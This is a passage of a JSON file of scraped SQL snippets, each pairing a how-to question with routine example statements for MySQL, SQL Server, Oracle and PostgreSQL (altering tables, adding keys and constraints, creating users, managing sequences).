    "description": "ALTER TABLE test ADD COLUMN IF NOT EXISTS column_a VARCHAR(255); ALTER TABLE test MODIFY IF EXISTS column_a VARCHAR(255); \n",
    "reg_date": "2021-10-12T09:54:01.000Z"
  },
  {
    "id": 280,
    "keyword": null,
    "link": null,
    "title": " add column if not exists mysql",
    "description": "-- ALTER TABLE tbl_name ADD COLUMN column_name column_definition  --\t\t[FIRST|AFTER existing_column]; ALTER TABLE office ADD COLUMN phone VARCHAR(200) DEFAULT '000' AFTER name; ALTER TABLE office ADD COLUMN flag INT(1) FIRST; ALTER TABLE office ADD COLUMN last_col INT(2);\t-- Last column is default position -- &darr; Test it (Fiddle)\nSELECT count(*) INTO @EXIST FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'mydatabase'   AND COLUMN_NAME = 'mycolumn'   AND TABLE_NAME = 'mytable' LIMIT 1;  SET @query = IF (@exist <= 0, 'ALTER TABLE mydatabase.`mytable`  ADD COLUMN `mycolumn` MEDIUMTEXT NULL',     'select \\' COLUMN EXISTS\\' status'); PREPARE stmt FROM @query; EXECUTE stmt;\n",
    "reg_date": "2021-10-12T09:54:01.000Z"
  },
  {
    "id": 281,
    "keyword": null,
    "link": null,
    "title": " add column in mysq",
    "description": "ALTER TABLE vendors ADD COLUMN phone VARCHAR(15) AFTER name;\nALTER TABLE Table_name ADD Email varchar(255);\nALTER TABLE Table_name ADD name_column INT(255);\n-- ALTER TABLE tbl_name ADD COLUMN column_name column_definition  --\t\t[FIRST|AFTER existing_column]; ALTER TABLE office ADD COLUMN phone VARCHAR(200) DEFAULT '000' AFTER name; ALTER TABLE office ADD COLUMN flag INT(1) FIRST; ALTER TABLE office ADD COLUMN last_col INT(2);\t-- Last column is default position -- &darr; Test it (Fiddle)\n",
    "reg_date": "2021-10-12T09:54:01.000Z"
  },
  {
    "id": 282,
    "keyword": null,
    "link": null,
    "title": " add column in sql",
    "description": "ALTER TABLE Customers ADD Email varchar(255); \nALTER TABLE table_name ADD column_name datatype;  --example ALTER TABLE Customers ADD Email varchar(255);\nALTER TABLE table_name ADD column_name varchar(50);\nALTER TABLE table_name  ALTER COLUMN column_name new_data_type(size); \nALTER TABLE table_name ADD column_name datatype;\nALTER TABLE `fb_banners` ADD `city_id` BIGINT(20) UNSIGNED NULL DEFAULT NULL AFTER `BannerID`, ADD INDEX `Foreign_city_id_banners` (`city_id`) USING BTREE, ADD CONSTRAINT `Foreign_city_id_banners` FOREIGN KEY (`city_id`) REFERENCES `foodsafari`.`fb_cities` (`id`) ON UPDATE CASCADE ON DELETE CASCADE;\n",
    "reg_date": "2021-10-12T09:54:01.000Z"
  },
  {
    "id": 283,
    "keyword": null,
    "link": null,
    "title": " add column mysql with foreign key",
    "description": "ALTER TABLE orders ADD  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE; \nALTER TABLE `TABLE_NAME` ADD COLUMN `COLUMN_NAME` BIGINT(20) UNSIGNED NULL DEFAULT NULL AFTER `AFTER_COLUMN_NAME`,  ADD FOREIGN KEY `FOREIGN_RELATION_NAME`(`COLUMN_NAME`) REFERENCES `FOREIGN_TABLE`(`FOREIGN_COLUMN`)  ON UPDATE SET NULL ON DELETE SET NULL\nALTER TABLE tryholpz_demo07.core_modules  ADD COLUMN belongs_to_role INT,  ADD FOREIGN KEY core_modules(belongs_to_role) REFERENCES role_specific_modules_info(id) ON DELETE CASCADE\n",
    "reg_date": "2021-10-12T09:54:01.000Z"
  },
  {
    "id": 284,
    "keyword": null,
    "link": null,
    "title": " add column table pl sql",
    "description": "ALTER TABLE tablename MODIFY columnname varchar2(100)\nALTER TABLE table_name   ADD column_name column_definition;\n",
    "reg_date": "2021-10-12T09:54:01.000Z"
  },
  {
    "id": 285,
    "keyword": null,
    "link": null,
    "title": " add column table sql default value",
    "description": "ALTER TABLE users ADD visit_number INT DEFAULT 0;\n",
    "reg_date": "2021-10-12T09:54:01.000Z"
  },
  {
    "id": 286,
    "keyword": null,
    "link": null,
    "title": " add column to table sql",
    "description": "ALTER TABLE Customers ADD Email varchar(255); \nALTER TABLE table_name ADD column_name datatype;  --example ALTER TABLE Customers ADD Email varchar(255);\nALTER TABLE table_name ADD column_name varchar(50);\nALTER TABLE table_name ADD column_name datatype;\nALTER TABLE table ADD COLUMN column VARCHAR (255) NOT NULL AFTER column;\nALTER TABLE dbo.doc_exa  ADD column_b VARCHAR(20) NULL,  \tcolumn_c INT NULL ;\n",
    "reg_date": "2021-10-12T09:54:02.000Z"
  },
  {
    "id": 287,
    "keyword": null,
    "link": null,
    "title": " add computed column to table sql server",
    "description": "                                     ALTER TABLE persons ADD full_name AS (first_name + ' ' + last_name) PERSISTED; \n",
    "reg_date": "2021-10-12T09:54:02.000Z"
  },
  {
    "id": 288,
    "keyword": null,
    "link": null,
    "title": " add constraint fk",
    "description": "ALTER TABLE Orders ADD CONSTRAINT FK_PersonOrder FOREIGN KEY (PersonID) REFERENCES Persons(PersonID);\n",
    "reg_date": "2021-10-12T09:54:02.000Z"
  },
  {
    "id": 289,
    "keyword": null,
    "link": null,
    "title": " add constraint sql",
    "description": "ALTER TABLE Persons ADD CONSTRAINT PK_Person PRIMARY KEY (ID,LastName);\n",
    "reg_date": "2021-10-12T09:54:02.000Z"
  },
  {
    "id": 290,
    "keyword": null,
    "link": null,
    "title": " add constraint to existing table mysql",
    "description": "ALTER TABLE table_name ADD CONSTRAINT constraint_name UNIQUE (column1, column2, ... column_n);\n",
    "reg_date": "2021-10-12T09:54:02.000Z"
  },
  {
    "id": 291,
    "keyword": null,
    "link": null,
    "title": " add created and updatedAt fields in mysql",
    "description": "ALTER TABLE t1 ADD COLUMN createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP, ADD COLUMN updatedAt DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP; \n",
    "reg_date": "2021-10-12T09:54:02.000Z"
  },
  {
    "id": 292,
    "keyword": null,
    "link": null,
    "title": " add current timestamp in mysql",
    "description": "INSERT INTO servers (server_name, online_status, exchange, disk_space, network_shares,date_time) VALUES('m1','ONLINE','ONLINE','100GB','ONLINE',now() )  #Replace date_time with the column name you want to use to insert the time.\n",
    "reg_date": "2021-10-12T09:54:02.000Z"
  },
  {
    "id": 293,
    "keyword": null,
    "link": null,
    "title": " add default sql server",
    "description": "create table bla (id int)  alter table bla add constraint dt_bla default 1 for id    insert bla default values  select * from bla \n",
    "reg_date": "2021-10-12T09:54:02.000Z"
  },
  {
    "id": 294,
    "keyword": null,
    "link": null,
    "title": " add many column to sap iq table",
    "description": " alter table DataControl add C1 VARCHAR(100) NULL, add\tC2 VARCHAR(100) NULL, add\tC3 VARCHAR(100) NULL \n",
    "reg_date": "2021-10-12T09:54:02.000Z"
  },
  {
    "id": 295,
    "keyword": null,
    "link": null,
    "title": " add multiple columns to table sql",
    "description": "//Example ALTER TABLE employees   ADD last_name VARCHAR(50),       first_name VARCHAR(40);\nALTER TABLE table_name   ADD column_1 column_definition,       column_2 column_definition,       ...       column_n column_definition;\n",
    "reg_date": "2021-10-12T09:54:02.000Z"
  },
  {
    "id": 296,
    "keyword": null,
    "link": null,
    "title": " add multiple field in table sql",
    "description": "ALTER TABLE employee   ADD (   \t  last_name VARCHAR(50) NOT NULL,       first_name VARCHAR(40) NOT NULL       );\n",
    "reg_date": "2021-10-12T09:54:03.000Z"
  },
  {
    "id": 297,
    "keyword": null,
    "link": null,
    "title": " add multiple row table pl sql",
    "description": "INSERT INTO real_table_name (person_id, given_name, family_name, title)    WITH temp_table AS (      SELECT 4, 'Ruth',     'Fox',      'Mrs'    FROM dual UNION ALL      SELECT 5, 'Isabelle', 'Squirrel', 'Miss'   FROM dual UNION ALL      SELECT 6, 'Justin',   'Frog',     'Master' FROM dual UNION ALL      SELECT 7, 'Lisa',     'Owl',      'Dr'     FROM dual    )    SELECT * FROM temp_table\n",
    "reg_date": "2021-10-12T09:54:03.000Z"
  },
  {
    "id": 298,
    "keyword": null,
    "link": null,
    "title": " add new column after in sql",
    "description": "ALTER TABLE vendors ADD COLUMN phone VARCHAR(15) AFTER name;\nALTER TABLE `fb_banners` ADD `city_id` BIGINT(20) UNSIGNED NULL DEFAULT NULL AFTER `BannerID`, ADD INDEX `Foreign_city_id_banners` (`city_id`) USING BTREE, ADD CONSTRAINT `Foreign_city_id_banners` FOREIGN KEY (`city_id`) REFERENCES `foodsafari`.`fb_cities` (`id`) ON UPDATE CASCADE ON DELETE CASCADE;\n",
    "reg_date": "2021-10-12T09:54:03.000Z"
  },
  {
    "id": 299,
    "keyword": null,
    "link": null,
    "title": " add new column in sql with foreign key",
    "description": "ALTER TABLE `fb_banners` ADD `city_id` BIGINT(20) UNSIGNED NULL DEFAULT NULL AFTER `BannerID`, ADD INDEX `Foreign_city_id_banners` (`city_id`) USING BTREE, ADD CONSTRAINT `Foreign_city_id_banners` FOREIGN KEY (`city_id`) REFERENCES `foodsafari`.`fb_cities` (`id`) ON UPDATE CASCADE ON DELETE CASCADE;\n",
    "reg_date": "2021-10-12T09:54:03.000Z"
  },
  {
    "id": 300,
    "keyword": null,
    "link": null,
    "title": " add new column not null sql server",
    "description": "ALTER TABLE MY_TABLE ADD STAGE INT NOT NULL DEFAULT '0';\n",
    "reg_date": "2021-10-12T09:54:04.000Z"
  },
  {
    "id": 301,
    "keyword": null,
    "link": null,
    "title": " add new column to the table mysql",
    "description": "ALTER TABLE vendors ADD COLUMN phone VARCHAR(15) AFTER name;\nALTER TABLE `TABLE_NAME`  \tADD `COLUMN_NAME` VARCHAR(50) NULL     AFTER `COLUMN_NAME_AFTER`;\n-- ALTER TABLE tbl_name ADD COLUMN column_name column_definition  --\t\t[FIRST|AFTER existing_column]; ALTER TABLE office ADD COLUMN phone VARCHAR(200) DEFAULT '000' AFTER name; ALTER TABLE office ADD COLUMN flag INT(1) FIRST; ALTER TABLE office ADD COLUMN last_col INT(2);\t-- Last column is default position -- &darr; Test it (Fiddle)\nALTER TABLE table   ADD [COLUMN] column_name column_definition   [FIRST|AFTER existing_column];\n",
    "reg_date": "2021-10-12T09:54:04.000Z"
  },
  {
    "id": 302,
    "keyword": null,
    "link": null,
    "title": " add primary key constraint in oracle",
    "description": "-- Adding Using alter ALTER TABLE table_name ADD CONSTRAINT constraint_name PRIMARY KEY (column1, column2, ... column_n);\n-- Dropping Using alter ALTER TABLE table_name DROP CONSTRAINT constraint_name;\n",
    "reg_date": "2021-10-12T09:54:04.000Z"
  },
  {
    "id": 303,
    "keyword": null,
    "link": null,
    "title": " add primary key to database sql",
    "description": "alter table Persion add primary key (persionId,Pname,PMID) \nALTER TABLE `tblauto`   ADD PRIMARY KEY (`id`);  --\nALTER TABLE Production.TransactionHistoryArchive    ADD CONSTRAINT PK_TransactionHistoryArchive_TransactionID PRIMARY KEY CLUSTERED (TransactionID); \nCREATE TABLE Persons (     ID int NOT NULL,     LastName varchar(255) NOT NULL,     FirstName varchar(255),     Age int,     PRIMARY KEY (ID) );\n",
    "reg_date": "2021-10-12T09:54:04.000Z"
  },
  {
    "id": 304,
    "keyword": null,
    "link": null,
    "title": " add primary key to existing table sql",
    "description": "alter table Persion add primary key (persionId,Pname,PMID) \nALTER TABLE <Table_Name> DROP CONSTRAINT <constraint_name>  ALTER TABLE <Table_Name> ADD CONSTRAINT <constraint_name> PRIMARY KEY (<Column1>,<Column2>)\nALTER TABLE Persons  ADD PRIMARY KEY (ID); \nALTER TABLE `tblauto`   ADD PRIMARY KEY (`id`);  --\nALTER TABLE Production.TransactionHistoryArchive    ADD CONSTRAINT PK_TransactionHistoryArchive_TransactionID PRIMARY KEY CLUSTERED (TransactionID); \n-- NOTE: this is for SQL-Oracle specifically  -- example: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = 'CUSTOMERS'  AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner;  -- syntax: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = '<table-name>' -- Replace <table-name> with your table-name AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner; \n",
    "reg_date": "2021-10-12T09:54:04.000Z"
  },
  {
    "id": 305,
    "keyword": null,
    "link": null,
    "title": " add primary key to table",
    "description": "alter table Persion add primary key (persionId,Pname,PMID) \nALTER TABLE Persons  ADD PRIMARY KEY (ID); \nCREATE TABLE Persons (     ID int NOT NULL,     LastName varchar(255) NOT NULL,     FirstName varchar(255),     Age int,     PRIMARY KEY (ID) );\n",
    "reg_date": "2021-10-12T09:54:04.000Z"
  },
  {
    "id": 306,
    "keyword": null,
    "link": null,
    "title": " add privilege mysql user",
    "description": "GRANT ALL PRIVILEGES ON * . * TO 'newuser'@'localhost'; \n",
    "reg_date": "2021-10-12T09:54:04.000Z"
  },
  {
    "id": 307,
    "keyword": null,
    "link": null,
    "title": " add super privilege mysql",
    "description": "grant super on *.* to user@localhost; FLUSH PRIVILEGES;\n",
    "reg_date": "2021-10-12T09:54:05.000Z"
  },
  {
    "id": 308,
    "keyword": null,
    "link": null,
    "title": " add time to date sql",
    "description": "ADDTIME(NOW(),'5:30:00')  \n",
    "reg_date": "2021-10-12T09:54:05.000Z"
  },
  {
    "id": 309,
    "keyword": null,
    "link": null,
    "title": " add timestamp column to existing table ms sql server",
    "description": "ALTER TABLE Tbl ADD time_stamp TIMESTAMP\n",
    "reg_date": "2021-10-12T09:54:05.000Z"
  },
  {
    "id": 310,
    "keyword": null,
    "link": null,
    "title": " add timestamp column to existing table t-sql",
    "description": "ALTER TABLE Tbl ADD time_stamp TIMESTAMP\n",
    "reg_date": "2021-10-12T09:54:05.000Z"
  },
  {
    "id": 311,
    "keyword": null,
    "link": null,
    "title": " add unique constraint sql server multiple columns",
    "description": "ALTER TABLE dbo.User   ADD CONSTRAINT ucCodes UNIQUE (fcode, scode, dcode) \n",
    "reg_date": "2021-10-12T09:54:05.000Z"
  },
  {
    "id": 312,
    "keyword": null,
    "link": null,
    "title": " add user mysql",
    "description": "CREATE USER 'user'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON * . * TO 'user'@'localhost'; FLUSH PRIVILEGES;\nCREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON * . * TO 'newuser'@'localhost'; FLUSH PRIVILEGES;\nCREATE USER 'norris'@'localhost' IDENTIFIED BY 'password';\n# First Login mysql shell.. sudo mysql -u root -p  CREATE USER 'username'@'localhost' IDENTIFIED BY 'P4ssW0rd'; GRANT ALL PRIVILEGES ON *.* TO 'username'@'localhost'; FLUSH PRIVILEGES;\nCREATE USER 'pdam'@'localhost' IDENTIFIED BY 'pdamP@ssw0rd'; # create user GRANT ALL PRIVILEGES ON `pdam_db`.* TO 'pdam'@'localhost'; # set db access FLUSH PRIVILEGES; # Reload\n## ADD user in mysql && have problem with root user ##  # First Login mysql shell.. sudo mysql -u root -p   ## Also check if you are unable to login in mysql without sudo...  ## Creating new user and giving permissions... # Goto login shell of mysql... and type below commands...  #1 show databases; #2 use mysql; #3 select user, host, plugin from mysql.user; #4 create user 'your_user_name'@'localhost' identified by 'password'; #5 grant all privileges on *.* to 'your_user_name'@'localhost'; #6 update user set plugin=\"caching_sha2_password\" where User=\"your_user_name\"; \t#     .... Here caching_sha2_password you can see yours in #3 check  \t#\t\tyour table and see column (plugin) don't use root plugin... #7 flush privileges; #8 EXIT  #### DONE Now you created your user also you can user without sudo...  mysql -u your_user_name -p  ## For password check your step #4 and enter same password...  ## Enjoy ALL DONE.... ## HAVE A NICE DAY!\n",
    "reg_date": "2021-10-12T09:54:05.000Z"
  },
  {
    "id": 313,
    "keyword": null,
    "link": null,
    "title": " add user mysql wordpress",
    "description": "INSERT INTO `databasename`.`wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('4', 'demo', MD5('demo'), 'Your Name', 'test@yourdomain.com', 'http://www.test.com/', '2011-06-07 00:00:00', '', '0', 'Your Name');     INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '4', 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}');     INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '4', 'wp_user_level', '10'); \n",
    "reg_date": "2021-10-12T09:54:05.000Z"
  },
  {
    "id": 314,
    "keyword": null,
    "link": null,
    "title": " adding current date time in mysql query",
    "description": "NOW()\n",
    "reg_date": "2021-10-12T09:54:05.000Z"
  },
  {
    "id": 315,
    "keyword": null,
    "link": null,
    "title": " adding data to table in sql python",
    "description": "import sqlite3  conn = sqlite3.connect('songs.db') c = conn.cursor() c.execute('INSERT INTO songs VALUES(\"Alone Pt II\", \"Alan Walker & Ava Max\", 2020)') # here we have added Song to database\n",
    "reg_date": "2021-10-12T09:54:05.000Z"
  },
  {
    "id": 316,
    "keyword": null,
    "link": null,
    "title": " adding generated time in row mysql workbench",
    "description": "ALTER TABLE  MODIFY dt_created datetime DEFAULT CURRENT_TIMESTAMP  ALTER TABLE  MODIFY dt_modified datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP\n",
    "reg_date": "2021-10-12T09:54:05.000Z"
  },
  {
    "id": 317,
    "keyword": null,
    "link": null,
    "title": " aggregate function in sql",
    "description": " -- Emp_Id is a Column Name  -- employee_tble is Table Name;   select count(Emp_Id) from employee_tbl;  select min(Salary) from employee_tbl;  select max(Salary) from employee_tbl;  select sum(Salary) from employee_tbl;  select avg(Salary) from employee_tbl;\nThe following are the most commonly used SQL aggregate functions: AVG &ndash; calculates the average of a set of values. COUNT &ndash; counts rows in a specified table or view. MIN &ndash; gets the minimum value in a set of values. MAX &ndash; gets the maximum value in a set of values. SUM &ndash; calculates the sum of values.  The following illustrates the syntax of an aggregate function: aggregate_function_name(DISTINCT | ALL expression)  In this syntax;  First, specify the name of an aggregate function that you want to use such as AVG, SUM, and MAX. Second, use DISTINCT if you want only distinct values are considered in the calculation or ALL if all values are considered in the calculation. By default, ALL is used if you don&rsquo;t specify any modifier. Third, the expression can be a column of a table or an expression that consists of multiple columns with arithmetic operators.  \nMAX &ndash; To find the number of the maximum values in the SQL table.  MIN &ndash; Number of the minimum values in the table.  COUNT &ndash; Get the number of count values in the SQL table.  AVG &ndash; Find average values in the SQL table.  SUM &ndash;  Return the summation of all non-null values in the SQL table.\n--- GROUP FUNCTION | MULTI ROW FUNCTION | AGGREGATE FUNCTION  --- COUNT , MAX , MIN , SUM , AVG\n--- GROUP FUNCTION | MULTI ROW FUNCTION | AGGREGATE FUNCTION  --- COUNT , MAX , MIN , SUM , AVG \n&bull; Single Row Functions:(Lower, Upper, Substr, Length) function that will run for each row and  return value for each row.  Multiple Row Functions (Group functions, Aggregate functions): (Count, MIN , MAX, AVG, SUM) will run for multiple rows and return a single value\n",
    "reg_date": "2021-10-12T09:54:06.000Z"
  },
  {
    "id": 318,
    "keyword": null,
    "link": null,
    "title": " ajouter une clé etrangere mysql",
    "description": "ALTER TABLE Commande ADD CONSTRAINT fk_client_numero FOREIGN KEY (client) REFERENCES Client(numero); \n",
    "reg_date": "2021-10-12T09:54:06.000Z"
  },
  {
    "id": 319,
    "keyword": null,
    "link": null,
    "title": " ajouter une contrainte de clé étrangère sql",
    "description": "ALTER TABLE Commande ADD CONSTRAINT fk_client_numero FOREIGN KEY (client) REFERENCES Client(numero); \n",
    "reg_date": "2021-10-12T09:54:06.000Z"
  },
  {
    "id": 320,
    "keyword": null,
    "link": null,
    "title": " alembic.util.exc.CommandError: Target database is not up to date.",
    "description": "$ flask db stamp head $ flask db migrate $ flask db upgrade\n",
    "reg_date": "2021-10-12T09:54:06.000Z"
  },
  {
    "id": 321,
    "keyword": null,
    "link": null,
    "title": " alembic generate sql",
    "description": "$ alembic upgrade 1975ea83b712:ae1027a6acf --sql > migration.sql \n",
    "reg_date": "2021-10-12T09:54:06.000Z"
  },
  {
    "id": 322,
    "keyword": null,
    "link": null,
    "title": " alert table name mysql",
    "description": "RENAME TABLE old_table TO new_table;\nALTER TABLE exampletable RENAME TO new_table_name;\n",
    "reg_date": "2021-10-12T09:54:06.000Z"
  },
  {
    "id": 323,
    "keyword": null,
    "link": null,
    "title": " alias mysql",
    "description": "SELECT sysdate() AS \"Current date\";   -- MySql Alias\nSELECT coluna AS alias_coluna FROM tabela AS alias_tabela;\n",
    "reg_date": "2021-10-12T09:54:06.000Z"
  },
  {
    "id": 324,
    "keyword": null,
    "link": null,
    "title": " all dependencies",
    "description": "-- Dependencies on a view, table, ... SELECT *   FROM ALL_DEPENDENCIES\t\t\t-- or DBA_DEPENDENCIES or USER_DEPENDENCIES  WHERE TYPE = 'VIEW'\t\t\t-- or 'PROCEDURE', 'SYNONYM'...    AND REFERENCED_OWNER = 'OBJECT_OWNER'    AND REFERENCED_NAME = 'OBJECT_NAME';\n",
    "reg_date": "2021-10-12T09:54:06.000Z"
  },
  {
    "id": 325,
    "keyword": null,
    "link": null,
    "title": " all sql commands with examples",
    "description": "DROP DATABASE db_name;\n",
    "reg_date": "2021-10-12T09:54:06.000Z"
  },
  {
    "id": 326,
    "keyword": null,
    "link": null,
    "title": " allow null in psql",
    "description": "ALTER TABLE mytable ALTER COLUMN mycolumn DROP NOT NULL; \n",
    "reg_date": "2021-10-12T09:54:06.000Z"
  },
  {
    "id": 327,
    "keyword": null,
    "link": null,
    "title": " allsource oracle",
    "description": "select * from   all_source where  lower(text) like lower('%Some source%');\n",
    "reg_date": "2021-10-12T09:54:07.000Z"
  },
  {
    "id": 328,
    "keyword": null,
    "link": null,
    "title": " alphabetical order mysql",
    "description": "-- use ORDER BY ASCending or DESCending SELECT column_name(s) FROM table_name ORDER BY column_name(s) ASC|DESC \n",
    "reg_date": "2021-10-12T09:54:07.000Z"
  },
  {
    "id": 329,
    "keyword": null,
    "link": null,
    "title": " alter column in table postgres",
    "description": "ALTER TABLE table_name   ALTER COLUMN column_name TYPE column_definition;\n",
    "reg_date": "2021-10-12T09:54:07.000Z"
  },
  {
    "id": 330,
    "keyword": null,
    "link": null,
    "title": " alter column length sql server",
    "description": "ALTER TABLE [table_name] ALTER COLUMN [column_name] varchar(150) \n",
    "reg_date": "2021-10-12T09:54:07.000Z"
  },
  {
    "id": 331,
    "keyword": null,
    "link": null,
    "title": " alter column to not null with default value sql server",
    "description": "ALTER TABLE SomeTable         ADD SomeCol Bit NULL --Or NOT NULL.  CONSTRAINT D_SomeTable_SomeCol --When Omitted a Default-Constraint Name is autogenerated.     DEFAULT (0)--Optional Default-Constraint. WITH VALUES --Add if Column is Nullable and you want the Default Value for Existing Records.\n",
    "reg_date": "2021-10-12T09:54:07.000Z"
  },
  {
    "id": 332,
    "keyword": null,
    "link": null,
    "title": " alter constraint in sql",
    "description": "You can not alter constraints ever but you can drop them and then recreate.  Have look on this      ALTER TABLE your_table DROP CONSTRAINT ACTIVEPROG_FKEY1;  and then recreate it with ON DELETE CASCADE like this      ALTER TABLE your_table     add CONSTRAINT ACTIVEPROG_FKEY1 FOREIGN KEY(ActiveProgCode) REFERENCES PROGRAM(ActiveProgCode)         ON DELETE CASCADE; hope this help\n",
    "reg_date": "2021-10-12T09:54:07.000Z"
  },
  {
    "id": 333,
    "keyword": null,
    "link": null,
    "title": " alter constraint postgres",
    "description": "/* Drop your constraint */ alter table yourtable drop constraint constraint_name;  /* Create new constraint */ alter table yourtable add constraint \"constraint_name\" FOREIGN KEY (some_id) REFERENCES yourtable(some_id) on delete cascade;\n",
    "reg_date": "2021-10-12T09:54:07.000Z"
  },
  {
    "id": 334,
    "keyword": null,
    "link": null,
    "title": " alter database name script",
    "description": "USE master;   GO   ALTER DATABASE MyTestDatabase SET SINGLE_USER WITH ROLLBACK IMMEDIATE GO ALTER DATABASE MyTestDatabase MODIFY NAME = MyTestDatabaseCopy ; GO   ALTER DATABASE MyTestDatabaseCopy SET MULTI_USER GO\n",
    "reg_date": "2021-10-12T09:54:07.000Z"
  },
  {
    "id": 335,
    "keyword": null,
    "link": null,
    "title": " alter foreign key",
    "description": "ALTER TABLE orders ADD  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE; \n-- On Create CREATE TABLE tableName (     ID INT,     SomeEntityID INT,     PRIMARY KEY (ID),     FOREIGN KEY (SomeEntityID)         REFERENCES SomeEntityTable(ID)         ON DELETE CASCADE );  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;     -- Add FK with a specific name  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD CONSTRAINT fk_name   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;\nALTER TABLE Orders ADD CONSTRAINT FK_PersonOrder FOREIGN KEY (PersonID) REFERENCES Persons(PersonID);\nA FOREIGN KEY is a key used to link two tables together. A FOREIGN KEY is a field (or collection of fields) in one table that refers to the PRIMARY KEY in another table. The table containing the foreign key is called the child table, and the table containing the candidate key is called the referenced or parent table.  Example: # creating table users CREATE TABLE users( \tuser_id INT NOT NULL,   \tuser_name VARCHAR(64) NOT NULL,   \tuser_pass VARCHAR(32) NOT NULL,   \tPRIMARY KEY(user_id); ); # adding user data INSERT INTO users VALUES(1,\"Raj\",\"raj@123\");  # creating table orders CREATE TABLE orders( \torder_id INT NOT NULL,   \torder_description VARCHAR(255),   \torderer_id INT NOT NULL,   \tPRIMARY KEY(order_id),   \tFOREIGN KEY (orderer_id) REFERENCES users(user_id) ); # adding order data INSERT INTO orders VALUES(1,\"Daily groceries\",1);\nALTER TABLE Employee ADD FOREIGN KEY (DeptNo) REFERENCES Department(DeptNo); \nHere is the basic syntax of defining a foreign key constraint in the CREATE TABLE or ALTER TABLE statement:  [CONSTRAINT constraint_name] FOREIGN KEY [foreign_key_name] (column_name, ...) REFERENCES parent_table(colunm_name,...) [ON DELETE reference_option] [ON UPDATE reference_option] In this syntax:  First, specify the name of foreign key constraint that you want to create after the CONSTRAINT keyword. If you omit the constraint name, MySQL automatically generates a name for the foreign key constraint.  Second, specify a list of comma-separated foreign key columns after the FOREIGN KEY keywords. The foreign key name is also optional and is generated automatically if you skip it.  Third, specify the parent table followed by a list of comma-separated columns to which the foreign key columns reference.  Finally, specify how foreign key maintains the referential integrity between the child and parent tables by using the ON DELETE and ON UPDATE clauses.  The reference_option determines action which MySQL will take when values in the parent key columns are deleted (ON DELETE) or updated (ON UPDATE).  MySQL has five reference options: CASCADE, SET NULL, NO ACTION, RESTRICT, and SET DEFAULT.  CASCADE: if a row from the parent table is deleted or updated, the values of the matching rows in the child table automatically deleted or updated. SET NULL:  if a row from the parent table is deleted or updated, the values of the foreign key column (or columns) in the child table are set to NULL. RESTRICT:  if a row from the parent table has a matching row in the child table, MySQL rejects deleting or updating rows in the parent table. NO ACTION: is the same as RESTRICT. SET DEFAULT: is recognized by the MySQL parser. However, this action is rejected by both InnoDB and NDB tables. In fact, MySQL fully supports three actions: RESTRICT, CASCADE and SET NULL.  If you don&rsquo;t specify the ON DELETE and ON UPDATE clause, the default action is RESTRICT.  MySQL FOREIGN KEY examples Let&rsquo;s create a new database called fkdemo for the demonstration.  CREATE DATABASE fkdemo;  USE fkdemo; RESTRICT & NO ACTION actions Inside the fkdemo database, create two tables categories and products:  CREATE TABLE categories(     categoryId INT AUTO_INCREMENT PRIMARY KEY,     categoryName VARCHAR(100) NOT NULL ) ENGINE=INNODB;  CREATE TABLE products(     productId INT AUTO_INCREMENT PRIMARY KEY,     productName varchar(100) not null,     categoryId INT,     CONSTRAINT fk_category     FOREIGN KEY (categoryId)          REFERENCES categories(categoryId) ) ENGINE=INNODB; The categoryId in the products table is the foreign key column that refers to the categoryId column in the  categories table.  Because we don&rsquo;t specify any ON UPDATE and ON DELETE clauses, the default action is RESTRICT for both update and delete operation.\n",
    "reg_date": "2021-10-12T09:54:07.000Z"
  },
  {
    "id": 336,
    "keyword": null,
    "link": null,
    "title": " alter schema sql",
    "description": "ALTER SCHEMA toSchemaName TRANSFER fromSchemaName.TableName\nUSE AdventureWorks2012;   GO   ALTER SCHEMA HumanResources TRANSFER Person.Address;   GO   \nALTER TABLE domain.old RENAME TO new\n",
    "reg_date": "2021-10-12T09:54:08.000Z"
  },
  {
    "id": 337,
    "keyword": null,
    "link": null,
    "title": " alter sequence postgres",
    "description": "ALTER SEQUENCE eadmodulo_id_seq RESTART WITH 8;\nalter sequence your_sequence restart with 1000; \n",
    "reg_date": "2021-10-12T09:54:08.000Z"
  },
  {
    "id": 338,
    "keyword": null,
    "link": null,
    "title": " alter sequence set current value oracle",
    "description": "SELECT LAST_NUMBER FROM ALL_SEQUENCES WHERE SEQUENCE_NAME = 'seq_name';  ALTER SEQUENCE seq_name INCREMENT BY 100;\t-- Value to reach desired value - 1 SELECT seq_name.nextval FROM dual;\t\t\t-- Reinitialize value to desired ALTER SEQUENCE seq_name INCREMENT BY 1;\t\t-- Back to init step\n",
    "reg_date": "2021-10-12T09:54:08.000Z"
  },
  {
    "id": 339,
    "keyword": null,
    "link": null,
    "title": " alter session set nls date format",
    "description": "-- Date format for session ALTER SESSION SET NLS_DATE_FORMAT='DD/MM/YYYY HH24:MI:SS';\n",
    "reg_date": "2021-10-12T09:54:08.000Z"
  },
  {
    "id": 340,
    "keyword": null,
    "link": null,
    "title": " alter system kill session force",
